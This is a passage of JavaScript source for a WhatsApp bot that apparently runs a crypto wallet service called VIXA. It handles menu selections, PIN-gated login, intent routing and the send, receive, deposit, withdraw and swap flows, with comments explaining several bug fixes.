              //   `🏦 You selected *${bankName}*.\n\nPlease enter your 10-digit Account Number:`,
              //   phone_number_id,
              // );
              if (isNigeria) {
                await sendWhatsApp(
                  from,
                  `🏦 You selected *${bankName}*.\n\nPlease enter your 10-digit Account Number:`,
                  phone_number_id,
                );
              } else {
                await sendWhatsApp(
                  from,
                  `🏦 You selected *${bankName}*.\n\nPlease enter your *Account Number*:`,
                  phone_number_id,
                );
              }
              return;
            }

            switch (actionId) {
              case "SEND_CRYPTO": {
                // route to buy flow
                const session = await getSession(from);

                await updateSession(from, {
                  data: {
                    ...session.data,
                    send: {
                      step: "SELECT_SEND_TYPE",
                    },
                  },
                });

                await sendWhatsApp(
                  from,
                  {
                    type: "interactive",
                    interactive: {
                      type: "list",
                      body: {
                        text: "Who are you sending to? 😊",
                      },
                      action: {
                        button: "Choose recipient",
                        sections: [
                          {
                            title: "Send Options",
                            rows: [
                              {
                                id: "SEND_TYPE_P2P",
                                title: "Another Vixa user",
                                description: "Send to a phone number",
                              },
                              {
                                id: "SEND_TYPE_EXTERNAL",
                                title: "External wallet",
                                description: "Send to blockchain address",
                              },
                            ],
                          },
                        ],
                      },
                    },
                  },
                  phone_number_id,
                );

                // NOTE: the coin lookup that used to live here was dead — every
                // line that consumed it is commented out below, and the coins
                // are actually loaded by the SEND_TYPE_P2P / SEND_TYPE_EXTERNAL
                // handler once the user picks a recipient type. All it did was
                // fire a pointless request and, when that request failed, emit
                // a spurious "Unable to load supported coins" right after the
                // recipient menu had rendered fine.

                // const coins = coinsRes?.data?.data?.currencies || [];

                // // Unique by coin symbol
                // const uniqueCoins = Array.from(
                //   new Map(coins.map((c) => [c.coin, c])).values(),
                // );

                // const rows = uniqueCoins.slice(0, 10).map((coinObj) => ({
                //   id: `SEND_COIN_${coinObj.coin}`,
                //   title: coinObj.coin, // ✅ REQUIRED by WhatsApp
                //   description: `${coinObj.chains?.length || 1} network(s)`,
                // }));

                // await updateSession(from, {
                //   data: {
                //     ...session.data,
                //     send: {
                //       step: "SELECT_COIN",
                //       coins,
                //     },
                //   },
                // });

                // await sendWhatsApp(
                //   from,
                //   {
                //     type: "interactive",
                //     interactive: {
                //       type: "list",
                //       body: { text: "📤 Select coin to send" },
                //       action: {
                //         button: "Select coin",
                //         sections: [{ title: "Available Coins", rows }],
                //       },
                //     },
                //   },
                //   phone_number_id,
                // );

                break;
              }

              case "RECIEVE_CRYPTO": {
                const session = await getSession(from);
                const walletsRes = await fetchReceiveWallets();

                if (!walletsRes.success) {
                  await sendWhatsApp(
                    from,
                    "⚠️ Unable to load receive options right now.",
                    phone_number_id,
                  );
                  break;
                }

                const wallets = walletsRes?.data?.data?.data || [];
                if (!wallets.length) {
                  await sendWhatsApp(
                    from,
                    "⚠️ No receive wallets available.",
                    phone_number_id,
                  );
                  break;
                }

                const uniqueCoins = [...new Set(wallets.map((w) => w.coin))];

                await updateSession(from, {
                  data: {
                    ...session.data,
                    receive: { step: "SELECT_COIN", wallets },
                  },
                });

                await triggerItemSelectionFlow(from, phone_number_id, {
                  context: "RECEIVE_COIN",
                  items: uniqueCoins.map((coin) => ({
                    id: coin,
                    title: coin,
                    description: `Receive ${coin}`,
                  })),
                  bodyText: "📥 Select the coin you want to receive",
                  heading: "Select coin to receive",
                  label: "Coin",
                  cta: "Select Coin",
                });

                break;
              }

              case "DEPOSIT_CRYPTO": {
                try {
                  // 1. Get session (we need phone + pin)
                  const session = await getSession(from);
                  await updateSession(from, {
                    data: {
                      ...(session.data || {}),
                      phone_number_id,
                      pendingDeposit: true, // flag to indicate user is about to enter amount
                      depositCoin: "USDT", // default for now, can be dynamic
                      depositChain: "SOL", // default for now
                      depositCurrency: "NGN", // default for now
                    },
                  });

                  await sendWhatsApp(
                    from,
                    `💰 Please enter the amount in NGN you want to deposit for your ${
                      session.data?.depositCoin || "USDT"
                    } wallet:`,
                    phone_number_id,
                  );
                } catch (err) {
                  console.error("DEPOSIT_CRYPTO init error:", err);
                  await sendWhatsApp(
                    from,
                    "⚠️ Unable to initiate deposit. Please try again later.",
                    phone_number_id,
                  );
                }

                break;
              }

              case "WITHDRAW_CRYPTO":
                {
                  // Initialize the withdraw object
                  await updateSession(from, {
                    data: {
                      ...session.data,
                      withdraw: { step: "SELECT_WITHDRAW_REGION" },
                    },
                  });

                  await sendWhatsApp(
                    from,
                    {
                      type: "interactive",
                      interactive: {
                        type: "button",
                        body: { text: "📍 Where are you withdrawing to?" },
                        action: {
                          buttons: [
                            {
                              type: "reply",
                              reply: {
                                id: "WITHDRAW_REGION_NG",
                                title: "🇳🇬 Nigeria",
                              },
                            },
                            {
                              type: "reply",
                              reply: {
                                id: "WITHDRAW_REGION_OTHER",
                                title: "🌍 Other Countries",
                              },
                            },
                          ],
                        },
                      },
                    },
                    phone_number_id,
                  );
                  break;
                }
                break;

              case "SWAP_CRYPTO": {
                // This path previously had no empty-list guard, so a failed
                // lookup sent an item-selection flow with zero rows — the
                // blank "Coin" picker.
                const { coins: selectedCoins, error: swapErr } =
                  await loadSwapCoins();

                if (swapErr) {
                  await sendWhatsApp(from, swapErr, phone_number_id);
                  break;
                }

                await updateSession(from, {
                  data: {
                    ...(session.data || {}),
                    swap: {
                      step: "SELECT_FROM",
                      allCoins: selectedCoins,
                    },
                  },
                });

                await triggerItemSelectionFlow(from, phone_number_id, {
                  context: "SWAP_FROM",
                  items: selectedCoins.map((c) => ({
                    id: c.coin,
                    title: c.coin,
                    description: `Min: ${c.minAmount}, Max: ${c.maxAmount}`,
                  })),
                  bodyText: "🔄 Select the coin you want to swap from",
                  heading: "Select the coin you want to swap from",
                  label: "Coin",
                  cta: "Select Coin",
                });
                break;
              }
              case "GET_WALLET_BALANCE": {
                try {
                  // 1. Get session (we need phone + pin)
                  const session = await getSession(from);
                  await updateSession(from, {
                    data: { ...(session.data || {}), phone_number_id },
                  });

                  // const pin = session?.data?.pin;
                  // if (!pin) {
                  //   await sendWhatsApp(
                  //     from,
                  //     "⚠️ Please log in again to view your wallet balance.",
                  //     phone_number_id
                  //   );
                  //   break;
                  // }

                  // 2. Re-login to refresh token
                  // await loginUser({
                  //   phoneNumber: from,
                  //   pin,
                  // });

                  // 3. Fetch profile + balances
                  const me = await fetchAuthMe();
                  const balances = await fetchWalletBalances();

                  // 4. Construct dynamic balance message
                  const now = new Date();
                  const formattedDate = now.toLocaleDateString("en-US", {
                    month: "short",
                    day: "numeric",
                    year: "numeric",
                  });

                  let balanceText = `Hi ${me.firstName} 👋\n\n💼 *Your Wallet Balances*\n\n`;

                  if (!balances || balances.length === 0) {
                    balanceText += "You currently have no wallet balances.\n";
                  } else {
                    for (const bal of balances) {
                      balanceText += `• ${bal.coin}: ${bal.balance}\n`;
                    }
                  }

                  balanceText += `\n📅 Last updated: ${formattedDate}`;

                  // 5. Send message
                  await sendWhatsApp(from, balanceText, phone_number_id);

                  await sendWhatsApp(
                    from,
                    "What would you like to do next?",
                    phone_number_id,
                  );

                  await sendMainMenu(from, phone_number_id);

                  // // 5. Send message
                  // await sendWhatsApp(from, balanceText, phone_number_id);
                } catch (err) {
                  console.error("GET_WALLET_BALANCE error:", err);

                  await sendWhatsApp(
                    from,
                    "⚠️ Unable to fetch your wallet balance at the moment. Please try again shortly.",
                    phone_number_id,
                  );
                }

                break;
              }
              case "CONTACT_SUPPORT": {
                await sendWhatsApp(
                  from,
                  `🛟 *VIXA Support*\n\nNeed help? Reach us via:\n\n📧 *Email:* usevixa@gmail.com\n\nPlease include your registered phone number when contacting support.\n\nWhat else can I help you with?`,
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                break;
              }
              case "SETTINGS": {
                await sendWhatsApp(
                  from,
                  {
                    type: "interactive",
                    interactive: {
                      type: "list",
                      body: {
                        text: "⚙️ *Settings*\n\nWhat would you like to do?",
                      },
                      action: {
                        button: "Select Option",
                        sections: [
                          {
                            title: "Account Settings",
                            rows: [
                              {
                                id: "CHANGE_PIN",
                                title: "Change PIN",
                                description: "Update your 4-digit PIN",
                              },
                              {
                                id: "LOCK_WALLET",
                                title: "Lock Wallet",
                                description: "Lock your wallet access",
                              },
                              {
                                id: "UNLOCK_WALLET",
                                title: "Unlock Wallet",
                                description: "Restore your wallet access",
                              },
                            ],
                          },
                        ],
                      },
                    },
                  },
                  phone_number_id,
                );
                break;
              }
            }

            continue;
          }

          // 2.5 BUTTON REPLIES (Used for Yes/No Confirmations)
          if (
            msg.type === "interactive" &&
            msg.interactive?.type === "button_reply"
          ) {
            const actionId = msg.interactive.button_reply.id;

            // "Have Paid" is sent as an interactive *button* (see the DEPOSIT
            // PIN handler), so it arrives here — it used to be handled only in
            // the list_reply block above, where it could never match, and the
            // tap did nothing at all.
            if (actionId === "CONFIRM_DEPOSIT_PAYMENT") {
              const depositId =
                session.data?.depositId ?? session.data?.id ?? null;

              if (!depositId) {
                await sendWhatsApp(
                  from,
                  "⚠️ I couldn't find that deposit. If you've already paid, it will still be credited automatically.",
                  phone_number_id,
                );
                await updateSession(from, {
                  data: {
                    ...session.data,
                    awaitingDepositConfirmation: false,
                  },
                });
                await sendMainMenu(from, phone_number_id);
                return;
              }

              const confirmDeposit = await confirmPayment({ id: depositId });
              console.log(confirmDeposit, "confirmDeposit.data");

              await sendWhatsApp(
                from,
                `✅ Your deposit is currently being processed in the background.\n\nYou’ll receive a notification on WhatsApp (and email, if available) once it’s completed.\n\nThanks for using VIXA 🚀`,
                phone_number_id,
              );

              // Reset the awaiting confirmation state so it doesn't trigger again
              await updateSession(from, {
                data: {
                  ...session.data,
                  awaitingDepositConfirmation: false,
                },
              });

              await sendWhatsApp(
                from,
                "What would you like to do next?",
                phone_number_id,
              );

              await sendMainMenu(from, phone_number_id);
              return;
            }

            // The "Try Again" button on a rejected/failed NIN had no handler,
            // so it was inert — re-open the NIN flow.
            if (actionId === "NIN_RETRY") {
              await triggerNINFlow(from, phone_number_id);
              return;
            }

            // 🆕 REGION BUTTON REPLIES
            if (actionId === "WITHDRAW_REGION_NG") {
              // await sendWhatsApp(
              //   from,
              //   "⏳ Loading payment channels...",
              //   phone_number_id,
              // );

              // 1. Fetch channels dynamically for NG
              const channelsRes = await fetchPaymentChannels("NG", "withdraw");
              console.log(channelsRes);
              if (!channelsRes.success || !channelsRes.data?.items?.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ No payment channels available for Nigeria currently.",
                  phone_number_id,
                );
                return;
              }

              // 2. Grab the first channel ID
              const firstChannel = channelsRes.data.items[0];

              // 3. Save both to session
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    countryCode: "NG",
                    channelId: firstChannel.id,
                    step: "SELECT_WITHDRAW_TYPE",
                  },
                },
              });
              await sendWithdrawTypeMenu(from, phone_number_id);
              return;
            }

            if (actionId === "WITHDRAW_REGION_OTHER") {
              const countriesRes = await fetchSupportedCountries("africa");

              if (!countriesRes.success || !countriesRes.data.length) {
                const rawError =
                  countriesRes.error?.message || "Unknown server error";
                const friendlyMessage = await humanizeError(
                  rawError,
                  "load supported countries",
                );
                await sendWhatsApp(from, friendlyMessage, phone_number_id);
                return;
              }

              // countriesList feeds the WITHDRAW_COUNTRY_* handler; currentPage
              // drives the "See More" pages of sendPaginatedCountriesMenu.
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    step: "SELECT_COUNTRY",
                    countriesList: countriesRes.data,
                    currentPage: 0,
                  },
                },
              });

              // NOTE: this used to call triggerCountrySelectionFlow. The Flow
              // published behind COUNTRY_SELECTION_FLOW_ID is still Meta's
              // default WELCOME_SCREEN template, so every send came back
              // #131009 ("SELECT_COUNTRY is not allowed as first screen") and
              // the user got nothing at all. The list menu needs no Flow.
              await sendPaginatedCountriesMenu(
                from,
                phone_number_id,
                countriesRes.data,
                0,
              );
              return;
            }

            if (actionId === "WITHDRAW_CANCEL") {
              await updateSession(from, {
                data: { ...session.data, withdraw: null },
              });
              await sendWhatsApp(
                from,
                "❌ Withdrawal cancelled.",
                phone_number_id,
              );
              await sendMainMenu(from, phone_number_id);
              return;
            }

            // if (actionId === "QUOTE_CONFIRM_YES") {
            //   const countryCode = session.data.withdraw?.countryCode || "ng";
            //   const channelId = session.data.withdraw?.channelId;
            //   const banksRes = await fetchBanks(countryCode, channelId);
            //   if (!banksRes.success || !banksRes.data.length) {
            //     await sendWhatsApp(
            //       from,
            //       "⚠️ Unable to load banks right now. Please try again later.",
            //       phone_number_id,
            //     );
            //     return;
            //   }

            //   const allBanks = banksRes.data;

            //   await updateSession(from, {
            //     data: {
            //       ...session.data,
            //       withdraw: {
            //         ...session.data.withdraw,
            //         banks: allBanks, // full list saved to session
            //         currentBankPage: 0, // start on page 0
            //         step: "SELECT_BANK",
            //       },
            //     },
            //   });

            //   await sendPaginatedBanksMenu(from, phone_number_id, allBanks, 0);
            //   return;
            // }

            if (actionId === "QUOTE_CONFIRM_YES") {
              const countryCode = session.data.withdraw?.countryCode || "ng";
              const channelId = session.data.withdraw?.channelId;
              const banksRes = await fetchBanks(countryCode, channelId);
              if (!banksRes.success || !banksRes.data.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ Unable to load banks right now. Please try again later.",
                  phone_number_id,
                );
                return;
              }

              const allBanks = banksRes.data;

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    banks: allBanks,
                    currentBankPage: 0,
                    step: "SELECT_BANK",
                  },
                },
              });

              const bankFlowSent = await triggerBankSelectionFlow(
                from,
                phone_number_id,
                allBanks,
              );

              // If Meta rejects the Flow send — the failure mode that took the
              // country picker down — fall back to the list menu rather than
              // leaving the user with no reply.
              if (!bankFlowSent) {
                await sendPaginatedBanksMenu(
                  from,
                  phone_number_id,
                  allBanks,
                  0,
                );
              }
              return;
            }

            if (actionId === "ACCOUNT_CONFIRM_YES") {
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    step: "ENTER_EXECUTE_PIN",
                  },
                },
              });
              // await sendWhatsApp(
              //   from,
              //   "🔐 Enter your *4-digit PIN* to execute this withdrawal:",
              //   phone_number_id,
              // );
              await triggerPinFlow(from, phone_number_id, "WITHDRAW_EXECUTE");
              return;
            }
            continue;
          }

          // --- END FIX ---

          // Handle initial incoming text message to trigger the flow
          if (msg.type === "text") {
            console.log(
              `Incoming text from ${from} — sending flow trigger`,
              msg,
            );

            console.log("starts from here!!!");

            console.log(session, " store house");

            let rawText = msg.text?.body?.trim();

            // ==========================================
            // 1. THE AUTHENTICATION & ONBOARDING GATE
            // (Strictly handles first-time or returning unauthenticated users)
            // ==========================================

            // A. Is the user currently trying to log in?
            if (session.data?.awaitingPin) {
              const authResult = await handleAuthenticationGate({
                from,
                phone_number_id,
                msgText: rawText,
              });

              if (authResult.status === "SUCCESS") {
                await sendWhatsApp(
                  from,
                  `Welcome back ${authResult.me.firstName} 👋`,
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
              }
              // Stop processing. The user is either logged in now, or failed the PIN check.
              return;
            }

            // B. Does the user need to log in or register?
            if (!session.data?.authenticated) {
              console.log(`Checking registration status for ${from}...`);
              const checkData = await checkPhoneNumber(from);

              if (!checkData) {
                await sendWhatsApp(
                  from,
                  "⚠️ Service momentarily unavailable. Please try again later.",
                  phone_number_id,
                );
                return;
              }

              if (checkData.exists) {
                // User exists but isn't logged in -> Ask for PIN
                await updateSession(from, {
                  data: {
                    ...(session.data || {}),
                    awaitingPin: true,
                    pinAttempts: 0,
                  },
                });
                // await sendWhatsApp(
                //   from,
                //   "🔐 Welcome back to VIXA!\n\nPlease enter your *4-digit PIN* to continue.",
                //   phone_number_id,
                // );
                await triggerPinFlow(from, phone_number_id, "LOGIN");
              } else {
                // User does not exist -> Trigger Onboarding
                notifyOnboardingStageStarted(from, phone_number_id);
                await triggerFlow(from, phone_number_id);
              }
              // Stop processing. Do not pass to AI.
              return;
            }

            // ==========================================
            // 2. THE AI IN-FLOW INTERCEPTOR
            // (Only runs if session.data.authenticated === true)
            // ==========================================

            // const aiAnalysis = await analyzeUserIntent(rawText, session.data);
            // console.log("AI Intent:", aiAnalysis.intent);

            // // A. Handle Chit-chat or Confusion
            // if (aiAnalysis.intent === "CHITCHAT_OR_CLARIFY") {
            //   await sendWhatsApp(
            //     from,
            //     aiAnalysis.replyMessage,
            //     phone_number_id,
            //   );
            //   return;
            // }

            // // B. Handle Flow Cancellations
            // if (aiAnalysis.intent === "CANCEL_FLOW") {
            //   await updateSession(from, {
            //     data: {
            //       ...session.data,
            //       pendingDeposit: false,
            //       awaitingDepositPin: false,
            //       swap: null,
            //       send: null,
            //       withdraw: null,
            //       receive: null,
            //     },
            //   });
            //   await sendWhatsApp(
            //     from,
            //     "Okay, I've canceled that for you.",
            //     phone_number_id,
            //   );
            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }

            // // C. Handle new menu requests
            // if (aiAnalysis.intent === "START_NEW_FLOW") {
            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }

            // ═══════════════════════════════════════════════════════════
            // UNIFIED INTENT ROUTER
            //
            // Every text message from an authenticated user passes through
            // here exactly once — mid-flow or not. See src/ai/intentRouter.js
            // for the pipeline. Only PROVIDE_INPUT falls through to the state
            // machine below; everything else is answered and returns.
            // ═══════════════════════════════════════════════════════════
            const flowState = describeFlowState(session.data);
            const isInActiveFlow = flowState.active;

            // ── A pending "abandon this transaction?" question wins ──
            if (session.data?.pendingSwitch) {
              const pending = session.data.pendingSwitch;
              const answer = (rawText || "").toLowerCase();

              await updateSession(from, {
                data: { ...session.data, pendingSwitch: null },
              });
              session = await getSession(from);

              if (
                /^(y|yes|yeah|yea|yep|ok|okay|sure|go ahead|proceed|do it)$/.test(
                  answer,
                )
              ) {
                await startFlow(pending.flow, from, phone_number_id, {
                  ack: `👍 Cancelled. Taking you to ${humanFlowName(pending.flow)} 👇`,
                });
                return;
              }

              if (/^(n|no|nope|nah|stay|keep going)$/.test(answer)) {
                await sendWhatsApp(
                  from,
                  "👍 No problem — let's finish what you started.",
                  phone_number_id,
                );
                if (flowState.rePrompt) {
                  await sendWhatsApp(from, flowState.rePrompt, phone_number_id);
                }
                return;
              }
              // Anything else: don't trap them in a yes/no loop — fall
              // through and interpret the message normally.
            }

            // ── Confirming an amount we heard in a voice note ──
            if (session.data?.pendingVoiceAmount) {
              const pending = session.data.pendingVoiceAmount;
              const answer = (rawText || "").toLowerCase();

              await updateSession(from, {
                data: { ...session.data, pendingVoiceAmount: null },
              });
              session = await getSession(from);

              if (
                /^(y|yes|yeah|yea|yep|ok|okay|sure|correct|that's right|go ahead)$/.test(
                  answer,
                )
              ) {
                // Fall through with the confirmed value. rawText must move
                // too, or resolveIntent below still classifies "yes".
                msg.text.body = pending.value;
                rawText = pending.value;
                // Already confirmed — must not re-enter the echo gate.
                msg._fromVoice = false;
              } else if (/^(n|no|nope|nah|wrong|not right)$/.test(answer)) {
                await sendWhatsApp(
                  from,
                  "👍 No problem — please type the amount instead.",
                  phone_number_id,
                );
                if (flowState.rePrompt) {
                  await sendWhatsApp(from, flowState.rePrompt, phone_number_id);
                }
                return;
              }
              // Anything else: not a yes/no — interpret it normally.
            }

            const decision = await resolveIntent({
              text: rawText,
              sessionData: session.data,
              profile: { firstName: session.data?.firstName },
            });

            console.log(
              `[intent] "${rawText}" → ${decision.type}` +
                `${decision.flow ? `/${decision.flow}` : ""}` +
                ` (via ${decision.source}, conf ${decision.confidence})` +
                ` | state: ${flowState.flow || "NONE"}/${flowState.step || "-"}`,
            );

            // Structured so intent quality is measurable in Seq rather than
            // something we only discover from screenshots. Message text is
            // deliberately omitted when the step is sealed.
            logger.info("intent.resolved", {
              decisionType: decision.type,
              decisionFlow: decision.flow,
              source: decision.source,
              confidence: decision.confidence,
              currentFlow: flowState.flow,
              currentStep: flowState.step,
              sealed: flowState.sealed,
              text: flowState.sealed ? "[redacted]" : rawText,
            });

            if (decision.type === "ANSWER" || decision.type === "CLARIFY") {
              await sendWhatsApp(
                from,
                decision.reply ||
                  "I'm here to help with your VIXA wallet — what would you like to do?",
                phone_number_id,
              );

              // A CLARIFY tied to a flow is a yes/no question — remember it.
              if (decision.type === "CLARIFY" && decision.flow) {
                await updateSession(from, {
                  data: {
                    ...session.data,
                    pendingSwitch: { flow: decision.flow },
                  },
                });
                return;
              }

              // Answering a question must never cost the user their place.
              if (isInActiveFlow) {
                if (flowState.rePrompt) {
                  await sendWhatsApp(from, flowState.rePrompt, phone_number_id);
                }
              } else {
                await sendMainMenu(from, phone_number_id);
              }
              return;
            }

            if (decision.type === "MENU") {
              await sendMainMenu(from, phone_number_id);
              return;
            }

            if (decision.type === "CANCEL") {
              if (!isInActiveFlow) {
                await sendWhatsApp(
                  from,
                  "👍 There's nothing running right now.",
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: clearedFlowState(session.data),
              });
              await sendWhatsApp(
                from,
                "Okay, I've cancelled that for you. 👍",
                phone_number_id,
              );
              await sendMainMenu(from, phone_number_id);
              return;
            }

            if (decision.type === "SWITCH_FLOW") {
              if (!decision.flow) {
                await sendMainMenu(from, phone_number_id);
                return;
              }

              // Already in the flow they're asking for — re-show the step
              // instead of restarting and losing their progress.
              if (isInActiveFlow && flowState.flow === decision.flow) {
                await sendWhatsApp(
                  from,
                  flowState.rePrompt ||
                    "You're already on it — please continue above 👆",
                  phone_number_id,
                );
                return;
              }

              // Money is one confirmation away. Never bin that silently.
              if (isInActiveFlow && flowState.committed) {
                await updateSession(from, {
                  data: {
                    ...session.data,
                    pendingSwitch: { flow: decision.flow },
                  },
                });
                await sendWhatsApp(
                  from,
                  `⚠️ You have a ${humanFlowName(flowState.flow)} waiting to be completed.\n\n` +
                    `Cancel it and start a ${humanFlowName(decision.flow)} instead? Reply *yes* or *no*.`,
                  phone_number_id,
                );
                return;
              }

              await startFlow(decision.flow, from, phone_number_id, {
                ack: isInActiveFlow
                  ? `Sure — cancelling that. Taking you to ${humanFlowName(decision.flow)} 👇`
                  : null,
              });
              return;
            }

            // PROVIDE_INPUT falls through to the state machine below. Use the
            // router's normalised value so "5k" and "₦20,000" reach the same
            // parseFloat() calls as "5000" and "20000".
            if (
              decision.type === "PROVIDE_INPUT" &&
              decision.value &&
              msg.text
            ) {
              // A misheard amount is silent and expensive — "fifty" heard as
              // "fifteen" on a withdrawal. Confirm before acting.
              if (msg._fromVoice && flowState.expecting === "amount") {
                await updateSession(from, {
                  data: {
                    ...session.data,
                    pendingVoiceAmount: { value: decision.value },
                  },
                });
                await sendWhatsApp(
                  from,
                  `I heard: *${Number(decision.value).toLocaleString("en-NG")}*.\n\nReply *yes* to continue, or *no* to type it again.`,
                  phone_number_id,
                );
                return;
              }
              msg.text.body = decision.value;
            }

            if (session.data?.pendingDeposit) {
              // Treat text as deposit amount
              const amountNgn = parseFloat(msg.text?.body?.trim());

              if (isNaN(amountNgn) || amountNgn <= 0) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid amount greater than 0.",
                  phone_number_id,
                );
                return;
              }

              const MIN_DEPOSIT_NGN = 500;
              const MAX_DEPOSIT_NGN = 30_000_000;
              if (amountNgn < MIN_DEPOSIT_NGN || amountNgn > MAX_DEPOSIT_NGN) {
                await sendWhatsApp(
                  from,
                  `⚠️ Deposit must be between ₦${MIN_DEPOSIT_NGN.toLocaleString()} and ₦${MAX_DEPOSIT_NGN.toLocaleString()}. Please enter a new amount.`,
                  phone_number_id,
                );
                return;
              }

              const rateData = await fetchRates({
                fromCurrency: "naira",
                toCurrency: "USD",
              });

              console.log(rateData.data, "validate this");

              if (!rateData?.data?.success || !rateData.data) {
                await sendWhatsApp(
                  from,
                  "⚠️ Unable to retrieve exchange rates at the moment. Please try again shortly.",
                  phone_number_id,
                );
                return;
              }

              const formattedUpdatedAt = rateData.data.data.updatedAt
                ? new Date(rateData.data.data.updatedAt).toLocaleString(
                    "en-NG",
                    {
                      dateStyle: "medium",
                      timeStyle: "short",
                      timeZone: "Africa/Lagos",
                    },
                  )
                : "Just now";

              const rateMessage = `
💱 *Current Exchange Rate*

• Currency Pair: ${rateData.data.data.fromCurrency} → ${rateData.data.data.toCurrency}
• Buy Rate: ${rateData.data.data.buyRate}
• Sell Rate: ${rateData.data.data.sellRate}
• Base Rate: ${rateData.data.data.baseRate}

🕒 Updated: ${formattedUpdatedAt}
`.trim();

              await sendWhatsApp(from, rateMessage, phone_number_id);

              await updateSession(from, {
                data: {
                  ...session.data,
                  pendingDeposit: false,
                  awaitingDepositPin: true,
                  depositAmount: amountNgn,
                },
              });

              await triggerPinFlow(from, phone_number_id, "DEPOSIT");
              return;
            }

            if (session.data?.swap?.step === "ENTER_AMOUNT") {
              const amount = parseFloat(msg.text?.body?.trim());
              const { minAmount, maxAmount } = session.data.swap.fromCoinLimits;

              if (isNaN(amount)) {
                await sendWhatsApp(
                  from,
                  "⚠️ Enter a valid number.",
                  phone_number_id,
                );
                return;
              }

              if (amount < minAmount || amount > maxAmount) {
                await sendWhatsApp(
                  from,
                  `❌ Amount must be between ${minAmount} and ${maxAmount}`,
                  phone_number_id,
                );
                return;
              }

              const fromCoin = session.data.swap.fromCoin;
              // This site had no success check at all: a failed lookup left
              // toCoins empty and shipped an item picker with zero rows.
              const { coins: toCoins, error: toErr } =
                await loadSwapCoins(fromCoin);

              if (toErr) {
                await sendWhatsApp(from, toErr, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  swap: {
                    ...session.data.swap,
                    step: "SELECT_TO",
                    amount,
                    toCoins,
                  },
                },
              });

              await triggerItemSelectionFlow(from, phone_number_id, {
                context: "SWAP_TO",
                items: toCoins.map((c) => ({
                  id: c.coin,
                  title: c.coin,
                  description: `Min: ${c.minAmount}, Max: ${c.maxAmount}`,
                })),
                bodyText: "➡️ Select the coin you want to receive",
                heading: "Select the coin you want to receive",
                label: "Coin",
                cta: "Select Coin",
              });
              return;
            }

            if (session.data?.send?.step === "ENTER_AMOUNT") {
              console.log("amount is logged", msg.text?.body);
              const amount = parseFloat(msg.text?.body?.trim());
              const min = session.data.send.chain?.minWithdrawAmount || 0;

              if (isNaN(amount) || amount <= 0) {
                await sendWhatsApp(
                  from,
                  "⚠️ Enter a valid amount.",
                  phone_number_id,
                );
                return;
              }

              const isP2P = session.data.send.type === "P2P";

              if (!isP2P) {
                const min = session.data.send.chain?.minWithdrawAmount || 0;
                if (amount < min) {
                  await sendWhatsApp(
                    from,
                    `❌ Minimum withdraw is ${min}`,
                    phone_number_id,
                  );
                  return;
                }
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: {
                    ...session.data.send,
                    amount,
                    step: "ENTER_ADDRESS",
                  },
                },
              });

              // await sendWhatsApp(
              //   from,
              //   `📥 Enter recipient *${session.data.send.coin}* wallet address`,
              //   phone_number_id,
              // );
              if (isP2P) {
                await sendWhatsApp(
                  from,
                  "📱 Enter the recipient's **Phone Number**:\n(e.g., 08012345678)",
                  phone_number_id,
                );
              } else {
                await sendWhatsApp(
                  from,
                  `📥 Enter recipient *${session.data.send.coin}* wallet address:`,
                  phone_number_id,
                );
              }

              return;
            }

            if (session.data?.send?.step === "ENTER_ADDRESS") {
              const address = msg.text?.body?.trim();
              const isP2P = session.data.send.type === "P2P";

              if (isP2P) {
                // Simple check for phone number length
                if (address.length < 10) {
                  await sendWhatsApp(
                    from,
                    "⚠️ Invalid phone number. Please try again.",
                    phone_number_id,
                  );
                  return;
                }
              } else {
                // Wallet address check
                if (address.length < 10) {
                  await sendWhatsApp(
                    from,
                    "⚠️ Enter a valid wallet address.",
                    phone_number_id,
                  );
                  return;
                }
              }

              // if (!address || address.length < 10) {
              //   await sendWhatsApp(
              //     from,
              //     "⚠️ Enter a valid wallet address.",
              //     phone_number_id,
              //   );
              //   return;
              // }

              const needsTag = session.data.send.chain?.needTag;

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: {
                    ...session.data.send,
                    address,
                    step: needsTag ? "ENTER_TAG" : "ENTER_PIN",
                  },
                },
              });

              if (needsTag) {
                await sendWhatsApp(
                  from,
                  "🏷️ Enter destination tag / memo (required for this network)",
                  phone_number_id,
                );
                return;
              }

              // await sendWhatsApp(
              //   from,
              //   "🔐 Enter your *PIN* to confirm this transfer",
              //   phone_number_id,
              // );
              await triggerPinFlow(from, phone_number_id, "SEND");

              return;
            }

            if (session.data?.send?.step === "ENTER_TAG") {
              const tag = msg.text?.body?.trim();

              if (!tag) {
                await sendWhatsApp(
                  from,
                  "⚠️ Tag is required.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: {
                    ...session.data.send,
                    tag,
                    step: "ENTER_PIN",
                  },
                },
              });

              // await sendWhatsApp(
              //   from,
              //   "🔐 Enter your *PIN* to confirm this transfer",
              //   phone_number_id,
              // );
              await triggerPinFlow(from, phone_number_id, "SEND");

              return;
            }

            // if (session.data?.send?.step === "ENTER_PIN") {
            //   const pin = msg.text?.body?.trim();

            //   if (!pin || pin.length < 4) {
            //     await sendWhatsApp(
            //       from,
            //       "⚠️ Enter a valid PIN.",
            //       phone_number_id,
            //     );
            //     return;
            //   }

            //   const { coin, amount, address, chain, type } = session.data.send;

            //   // WhatsApp number of sender
            //   const userPhone = from;

            //   const sendRes = await executeSendCrypto({
            //     type,
            //     coin,
            //     chain: chain?.chain,
            //     amount,
            //     phoneNumber: userPhone,
            //     externalAddress: address,
            //     pin,
            //   });

            //   console.log(sendRes, "checking send crypto");

            //   if (!sendRes.success) {
            //     const rawError =
            //       sendRes.error?.message || "Unknown server error";
            //     const friendlyMessage = await humanizeError(
            //       rawError,
